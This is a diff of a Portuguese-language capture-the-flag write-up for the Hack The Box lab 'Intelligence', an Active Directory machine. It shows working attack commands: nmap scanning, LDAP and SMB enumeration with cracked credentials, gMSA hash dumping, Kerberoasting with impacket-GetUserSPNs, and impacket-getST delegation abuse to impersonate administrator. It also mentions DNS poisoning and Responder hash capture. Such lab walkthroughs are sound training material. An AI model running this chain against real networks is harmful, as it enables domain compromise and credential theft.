@@ -4,71 +4,9 @@ Intelligence
 
 ## Enumeration
 
+```
 sudo nmap -sS -T4 -Pn -A 10.10.10.248
-    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
-    Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 00:33 EDT
-    Nmap scan report for intelligence.htb (10.10.10.248)
-    Host is up (0.14s latency).
-    Not shown: 988 filtered ports
-    PORT     STATE SERVICE       VERSION
-    53/tcp   open  domain        Simple DNS Plus
-    80/tcp   open  http          Microsoft IIS httpd 10.0
-    | http-methods: 
-    |_  Potentially risky methods: TRACE
-    |_http-server-header: Microsoft-IIS/10.0
-    |_http-title: Intelligence
-    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-11 11:46:24Z)
-    135/tcp  open  msrpc         Microsoft Windows RPC
-    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
-    | ssl-cert: Subject: commonName=dc.intelligence.htb
-    | Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
-    | Not valid before: 2021-04-19T00:43:16
-    |_Not valid after:  2022-04-19T00:43:16
-    |_ssl-date: 2021-08-11T11:48:14+00:00; +7h12m40s from scanner time.
-    445/tcp  open  microsoft-ds?
-    464/tcp  open  kpasswd5?
-    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-    636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
-    | ssl-cert: Subject: commonName=dc.intelligence.htb
-    | Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
-    | Not valid before: 2021-04-19T00:43:16
-    |_Not valid after:  2022-04-19T00:43:16
-    |_ssl-date: 2021-08-11T11:48:12+00:00; +7h12m40s from scanner time.
-    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
-    | ssl-cert: Subject: commonName=dc.intelligence.htb
-    | Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
-    | Not valid before: 2021-04-19T00:43:16
-    |_Not valid after:  2022-04-19T00:43:16
-    |_ssl-date: 2021-08-11T11:48:14+00:00; +7h12m40s from scanner time.
-    3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
-    | ssl-cert: Subject: commonName=dc.intelligence.htb
-    | Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
-    | Not valid before: 2021-04-19T00:43:16
-    |_Not valid after:  2022-04-19T00:43:16
-    |_ssl-date: 2021-08-11T11:48:12+00:00; +7h12m40s from scanner time.
-    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-    OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
-    No OS matches for host
-    Network Distance: 2 hops
-    Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
-    
-    Host script results:
-    |_clock-skew: mean: 7h12m39s, deviation: 0s, median: 7h12m39s
-    | smb2-security-mode: 
-    |   2.02: 
-    |_    Message signing enabled and required
-    | smb2-time: 
-    |   date: 2021-08-11T11:47:35
-    |_  start_date: N/A
-    
-    TRACEROUTE (using port 445/tcp)
-    HOP RTT       ADDRESS
-    1   139.23 ms 10.10.14.1
-    2   140.72 ms intelligence.htb (10.10.10.248)
-    
-    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-    Nmap done: 1 IP address (1 host up) scanned in 123.85 seconds
+```
     
  
 Até então nada de versão interessante para procurarmos exploits
@@ -157,7 +95,7 @@ Depois de tert obtido as credenciais, continuamos a enumeração via LDAP.
 
 enumerating users
 
-    ldapsearch -x -h 10.10.248 -D "Tiffany.Molina@intelligence.htb" -W -b "cn=users,dc=intelligence,dc=htb"
+ldapsearch -x -h 10.10.248 -D "Tiffany.Molina@intelligence.htb" -W -b "cn=users,dc=intelligence,dc=htb"
     
 Command options explained:
 
@@ -200,10 +138,6 @@ Primeiro só visualizei os registros que já tinham no servidor;
  objectClass: top
  objectClass: dnsNode
  arecord: 10.10.14.8
- .
- .
- .
- 
  
  
  Aqui vale ressaltar que quando fui fazer o registro de DNS, notei que ocampo recordDns estava em base 64. Quando decodado, ainda sim não aparecia um IP address, as sim caracteres estranhos. Sendo assim, com uma pesquisa a respeito do assunto, notei que tem um formato específico essa informação conforme dcocumentação da microsoft que pode ser encontrada em:
@@ -219,7 +153,7 @@ Com as orientações desse post aqui:
  ![qownnotes-media-MTKZsl](../../../media/qownnotes-media-MTKZsl.png)
 
     
-    #!/usr/bin/perl
+#!/usr/bin/perl
     
     # Prints data from "dnsRecord" AD attribute
     
@@ -259,9 +193,13 @@ copiei e colei o hash obtido no responder e quebrei com o john
 
 ### Enumerar shares
 
-    crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy --shares
+```
+crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy --shares
+```
     
-    smbclient -L //10.10.10.248/ -U intelligence.htb/Ted.Graves
+```
+smbclient -L //10.10.10.248/ -U intelligence.htb/Ted.Graves
+```
     
 ### Obter hashes de senha
 
@@ -269,13 +207,23 @@ copiei e colei o hash obtido no responder e quebrei com o john
 
 (Esse foi o que funcionou)
     
-    python3.10 gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
-    
-    impacket-GetUserSPNs -request -dc-ip 10.10.10.248 intelligence.htb/Ted.Graves:Mr.Teddy
+
+
+```
+python3.10 gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
+```
+
+
+```
+impacket-GetUserSPNs -request -dc-ip 10.10.10.248 intelligence.htb/Ted.Graves:Mr.Teddy
+```
 
 ![qownnotes-media-QReoeZ](../../../media/qownnotes-media-QReoeZ.png)
 
-#### Normal users
+```
+impacket-getST -impersonate administrator -spn www/dc.intelligence.htb -hashes :<nt_hash_de_senha>  intelligence.htb/svc_int 
+```
 
-    
-
+```
+impacket-getST 'home.lab/svc_iis:P@ssw0rd10' -dc-ip 192.168.175.200 -spn 'MYSQL/dc01.home.lab' -impersonate administrator -altservice LDAP
+```
